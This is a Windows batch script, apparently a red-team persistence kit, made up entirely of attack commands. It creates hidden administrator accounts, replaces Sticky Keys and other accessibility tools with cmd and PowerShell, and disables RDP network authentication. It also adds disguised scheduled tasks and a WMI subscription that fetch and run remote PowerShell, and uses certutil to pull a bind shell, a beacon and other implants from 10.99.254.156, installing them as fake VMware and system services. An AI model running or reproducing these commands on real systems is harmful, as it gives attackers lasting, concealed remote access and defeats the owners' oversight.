@echo on
::Create Account
net user Jane Passw0rd!1 /add /y
net localgroup "Remote Desktop Users" Jane /add /y
net localgroup "Administrators" Jane /add /y
::Accessibility Features - Sticky Keys
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\cmd.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Narrator.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f
::Scheduled Task - Every 5 min.
schtasks /Create /SC MINUTE /MO 30 /RU SYSTEM /TN "Microsoft\Windows\Tcpip\IpAddressConflict3" /TR "powershell -NoProfile -ExecutionPolicy Bypass -Command 'iex ((new-object net.webclient).DownloadString('http://10.99.254.156/update'))'"
SCHTASKS /Create /TN "Microsoft\Windows\TextServicesFramework\MsCtfMonitorx86" /SC ONEVENT /EC Security /MO "*[System[(EventID=4625)]]" /RU SYSTEM /TR "net user hacker P@ssw0rd!1 /add && net localgroup Administrators hacker /add"
::RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v UserAuthentication /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fDenyTSConnections /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fSingleSessionPerUser /d 10 /f
::Windows Management Instrumentation Event Subscription - Every hour 8:40, 9:40, etc.
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE EventNamespace="root\cimv2", Name="BfeOnServiceStartTypeChange", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND (TargetInstance.DayOfWeek = 1 OR TargetInstance.DayOfWeek = 2 OR TargetInstance.DayOfWeek = 3 OR TargetInstance.DayOfWeek = 4 OR TargetInstance.DayOfWeek = 5 OR TargetInstance.DayOfWeek = 6 OR TargetInstance.DayOfWeek = 7) AND (TargetInstance.Hour = 8 OR TargetInstance.Hour = 9 OR TargetInstance.Hour = 10 OR TargetInstance.Hour = 11 OR TargetInstance.Hour = 12 OR TargetInstance.Hour = 13 OR TargetInstance.Hour = 14 OR TargetInstance.Hour = 15 OR TargetInstance.Hour = 16) AND TargetInstance.Minute = 40 AND TargetInstance.Second = 0 GROUP WITHIN 60"
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WindowsParentalControlsMigration", CommandLineTemplate="<POWERSHELL>"
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BfeOnServiceStartTypeChange\"", Consumer="CommandLineEventConsumer.Name=\"WindowsParentalControlsMigration\""
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /subcategory:"Registry" /success:enable
::Install the fake service
certutil.exe -urlcache -split -f "http://10.99.254.156/msdtl-Service.exe" c:\windows\system32\msdtl.exe
c:\windows\system32\msdtl.exe --startup auto install
certutil.exe -urlcache -split -f "http://10.99.254.156/BindShell_3398.exe" c:\windows\system32\wiredautoconfig.exe
c:\windows\system32\wiredautoconfig.exe --startup auto install
c:
cd\
cd "Program Files"
mkdir VMware
cd VMware
mkdir "VMware Tools"
certutil.exe -urlcache -split -f "http://10.99.254.156/raven-svc.exe" "C:\Program Files\VMware\VMware Tools\VMwareVirtualDiskHelper.exe"
sc.exe create "VMware Virtual Disk Helper Service" binpath= "C:\Program Files\VMware\VMware Tools\VMwareVirtualDiskHelper.exe" start= auto
sc.exe description "VMware Virtual Disk Helper Service" "Enables support for running virtual machines from a virtual disk partition"
certutil.exe -urlcache -split -f "http://10.99.254.156/beacon.exe" c:\windows\system32\beacon.exe
start c:\windows\system32\beacon.exe
